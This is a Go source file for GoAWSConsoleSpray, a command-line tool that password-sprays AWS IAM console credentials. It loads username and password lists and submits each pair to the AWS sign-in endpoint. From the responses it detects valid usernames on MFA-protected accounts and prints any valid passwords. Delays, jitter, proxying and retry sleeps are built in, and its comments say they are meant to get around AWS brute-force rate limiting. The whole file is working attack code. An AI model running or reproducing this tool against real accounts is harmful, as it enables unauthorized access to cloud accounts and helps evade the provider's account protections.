// SPDX-License-Identifier: GPL-3.0-or-later
package cmd

import (
	"bufio"
	"encoding/json"
	"io"
	"log"
	"math/rand/v2"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/projectdiscovery/retryablehttp-go"
	"github.com/spf13/cobra"
)

// AWS Login Response JSON Structure as of 6/10/2022
type AwsLoginResponse struct {
	State      string `json:"state"`
	Properties struct {
		Result      string `json:"result"`
		RedirectURL string `json:"redirectUrl"`
		Text        string `json:"text"`
		MFAType     string `json:"mfaType"`
	} `json:"properties"`
}

// User Details Structure
type userDetails struct {
	UserName  string
	AccountID string
}

// status codes enum for error handling
type ReturnStatus int64

const (
	SUCCESS    ReturnStatus = 0
	ACCOUNTMFA              = 1
	FAILED                  = 2
	CONNFAIL                = 3
)

var (
	fUserfile      string
	fPassfile      string
	fAccountID     string
	fProxy         string
	fStopOnSuccess bool
	fSleep         int
	fDelay         int
	fJitter        int

	signinURL = "https://signin.aws.amazon.com/authenticate"
	title     = "GoAWSConsoleSpray"

	rootCmd = &cobra.Command{
		Use:   title,
		Short: "A tool used to spray against AWS IAM Console Credentials",
		Long: `
	GoAWSConsoleSpray is used to spray AWS IAM console credentials from
	a list of usernames and passwords. The tool will detect valid usernames
	if those accounts are configured with MFA enabled. If no MFA, it will 
	detect successful login attempts. Accounts configured with MFA cannot
	be sprayed at this time.
	
	Example: GoAWSConsoleSpray -u users.txt -p pws.txt -a 123456789012`,

		Run: func(cmd *cobra.Command, args []string) {
			spray()
		},
	}
)

func Execute() {
	err := rootCmd.Execute()
	if err != nil {
		os.Exit(1)
	}
}

func init() {
	rootCmd.Flags().StringVarP(&fAccountID, "accountID", "a", "", "AWS Account ID (required unless username is ARN)")
	rootCmd.Flags().StringVarP(&fUserfile, "userfile", "u", "", "Username string or file (required) can be user, arn, or acctId:user format")
	rootCmd.Flags().StringVarP(&fPassfile, "passfile", "p", "", "Password string or file (required)")
	rootCmd.Flags().IntVarP(&fSleep, "sleep", "z", 0, "Optional Time to sleep between password requests")
	rootCmd.Flags().IntVarP(&fDelay, "delay", "d", 0, "Optional Time Delay Between Requests for rate limiting")
	rootCmd.Flags().IntVarP(&fJitter, "jitter", "j", 0, "Optional Time Jitter Between Requests (0 to n)")
	rootCmd.Flags().StringVarP(&fProxy, "proxy", "x", "", "HTTP or Socks proxy URL & Port. Schema: proto://ip:port")
	rootCmd.Flags().BoolVarP(&fStopOnSuccess, "stopOnSuccess", "s", false, "Stop password spraying on successful hit")

	rootCmd.MarkFlagRequired("userfile")
	rootCmd.MarkFlagRequired("passfile")
}

func spray() {
	// Tweak these options as needed if spraying faster or for better network handling w/ retries
	// http client setup
	opts := retryablehttp.DefaultOptionsSingle
	opts.RetryMax = 0
	transport := retryablehttp.DefaultHostSprayingTransport()

	if fProxy != "" {
		proxyURL, parseErr := url.Parse(fProxy)
		if parseErr != nil {
			log.Printf("\t[!] ERROR:\tProxy schema error. \tMessage: %s", parseErr.Error())
			return
		}
		transport.Proxy = http.ProxyURL(proxyURL)
	}

	client := retryablehttp.NewWithHTTPClient(&http.Client{
		Transport: transport,
	}, opts)

	var usernameList []userDetails
	var passwordList []string
	var userString, passString string

	// Open the files
	userfileHandle, err := os.Open(fUserfile)
	if err != nil {
		userString = fUserfile
	}
	defer userfileHandle.Close()
	passfileHandle, err := os.Open(fPassfile)
	if err != nil {
		passString = fPassfile
	}
	defer passfileHandle.Close()

	// Read username file
	if len(userString) == 0 {
		scanner := bufio.NewScanner(userfileHandle)
		for scanner.Scan() {
			var user userDetails
			file_entry := scanner.Text()
			res := regexp.MustCompile(`^\d{12}:`)
			if strings.Contains(file_entry, "arn:aws:iam::") {
				user.UserName = strings.Split(file_entry, "/")[2]
				user.AccountID = strings.Split(file_entry, ":")[4]
			} else if res.FindString(file_entry) != "" {
				user.UserName = strings.Split(file_entry, ":")[1]
				user.AccountID = strings.Split(file_entry, ":")[0]
			} else {
				if fAccountID == "" {
					log.Printf("\t[!] ERROR:\tAccountID not provided in username or CLI argument.")
					panic(1)
				}
				user.UserName = file_entry
				user.AccountID = fAccountID
			}
			usernameList = append(usernameList, user)
		}
		if err := scanner.Err(); err != nil {
			log.Printf("\t[!] ERROR:\tReading Userfile Failure. \tMessage: %s", err.Error())
			panic(err)
		}
	} else {
		var user userDetails
		res := regexp.MustCompile(`^\d{12}:`)
		if strings.Contains(userString, "arn:aws:iam::") {
			user.UserName = strings.Split(userString, ":")[4]
			user.AccountID = strings.Split(userString, "/")[1]
		} else if res.FindString(userString) != "" {
			user.UserName = strings.Split(userString, ":")[1]
			user.AccountID = strings.Split(userString, ":")[0]
		} else {
			if fAccountID == "" {
				log.Printf("\t[!] ERROR:\tAccountID not provided in username or CLI argument.")
				panic(1)
			}
			user.UserName = userString
			user.AccountID = fAccountID
		}
		usernameList = append(usernameList, user)
	}

	// Read password file
	if len(passString) == 0 {
		scanner := bufio.NewScanner(passfileHandle)
		for scanner.Scan() {
			passwordList = append(passwordList, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			log.Printf("\t[!] ERROR:\tReading Passfile Failure. \tMessage: %s", err.Error())
			panic(err)
		}
	} else {
		passwordList = []string{passString}
	}

	// Spraying Loop
	log.Printf("%s: [%d] users loaded. [%d] passwords loaded. [%d] potential login requests.", title, len(usernameList), len(passwordList), (len(usernameList) * len(passwordList)))
	log.Printf("%s: [%d] Delay [%d] Jitter [%d] Sleep [%s] Proxy [%t] StopOnSuccess", title, fDelay, fJitter, fSleep, fProxy, fStopOnSuccess)
loop:
	for i, pass := range passwordList {
		for _, user := range usernameList {
			check := attemptLogin(client, user.UserName, pass, user.AccountID, fDelay, fJitter, 1)
			// connection failures and stop on succes
			if check == CONNFAIL || (fStopOnSuccess && check == SUCCESS) {
				break loop
			}
			// skip the user if MFA is required, or a valid password was found
			if check == ACCOUNTMFA || check == SUCCESS {
				break
			}
		}
		if (fSleep > 0) && (i < (len(passwordList) - 1)) {
			log.Printf("%s: Sleep Value Configured. [%d/%d] Passwords Completed. Waiting %d seconds\n", title, (i + 1), len(passwordList), fSleep)
			time.Sleep(time.Duration(fSleep) * time.Second)
		}
	}
}

func attemptLogin(client *retryablehttp.Client, username string, password string, accountID string, delay int, jitter int, bfSleepRounds int) ReturnStatus {
	// check against empty strings from the file
	if len(username) < 1 || len(password) < 1 {
		return FAILED
	}

	// add rate limiting
	if delay > 0 {
		time.Sleep(time.Duration(delay) * time.Second)
	}

	// add jitter
	if jitter > 0 {
		time.Sleep(time.Duration(rand.IntN(jitter)) * time.Second)
	}

	// post params
	params := url.Values{}
	params.Set("action", "iam-user-authentication")
	params.Set("account", accountID)
	params.Set("username", username)
	params.Set("password", password)
	params.Set("client_id", "arn:aws:signin:::console/canvas")
	params.Set("redirect_uri", "https://console.aws.amazon.com")
	params.Set("rememberAccount", "false")

	// send the request
	resp, err := client.PostForm(signinURL, params)

	// AWS on successful requests sets the response headers to >4kb, which breaks the HTTP Transport...
	// If this exception occurs, that means a valid password was observed as a bunch of long cookies are made.
	if err != nil {
		if strings.Contains(err.Error(), "server response headers exceeded") {
			log.Printf("[+] SUCCESS:\tarn:aws:iam::%s:user/%s\tValid Password: %s \tMFA: false\n", accountID, username, password)
			return SUCCESS
		} else {
			log.Printf("[!] ERROR:\tarn:aws:iam::%s:user/%s\tHTTP Stack Failure. \tMessage: %s", accountID, username, err.Error())
			return CONNFAIL
		}
	} else {
		defer resp.Body.Close()

		// check for bruteforce ratelimiting
		if resp.StatusCode == 429 {
			log.Printf("[!] WARNING:\tarn:aws:iam::%s:user/%s\tSending requests too quickly! Sleeping for 4 seconds to get around rate limiting...\n", accountID, username)
			time.Sleep(4 * time.Second)
			return attemptLogin(client, username, password, accountID, delay, jitter, 1)
		}

		// Unmarshal the JSON response from AWS
		body, _ := io.ReadAll(resp.Body)
		var loginResponse AwsLoginResponse
		if err2 := json.Unmarshal(body, &loginResponse); err2 != nil {
			log.Printf("[!] ERROR:\tarn:aws:iam::%s:user/%s\tUnmarshal JSON Failure. AWS probably changed JSON response structure. \tMessage: %s", accountID, username, err.Error())
			return FAILED
		}

		// Check for success and failure conditions
		if loginResponse.State == "SUCCESS" {
			if loginResponse.Properties.Result == "MFA" {
				log.Printf("[*] MFA:\tarn:aws:iam::%s:user/%s\tValid username detected. Account Requires MFA. Skipping this user.\n", accountID, username)
				return ACCOUNTMFA
			}
			log.Printf("[+] SUCCESS:\tarn:aws:iam::%s:user/%s\tValid Password: %s \tMFA: false\n", accountID, username, password)
			return SUCCESS
		} else {
			if strings.Contains(loginResponse.Properties.Text, "many invalid passwords have been used") {
				log.Printf("[!] WARNING:\tAWS Account Bruteforce Ratelimit! Sleeping for %d seconds to get around this issue...\n", (5 * bfSleepRounds))
				time.Sleep(time.Duration(5*bfSleepRounds) * time.Second)

				// increase the time delay since we have hit the bruteforce ratelimit check
				return attemptLogin(client, username, password, accountID, delay, jitter, (bfSleepRounds + 1))
			}
			log.Printf("[-] FAIL:\tarn:aws:iam::%s:user/%s\tInvalid Password: %s\n", accountID, username, password)
			return FAILED
		}
	}
}
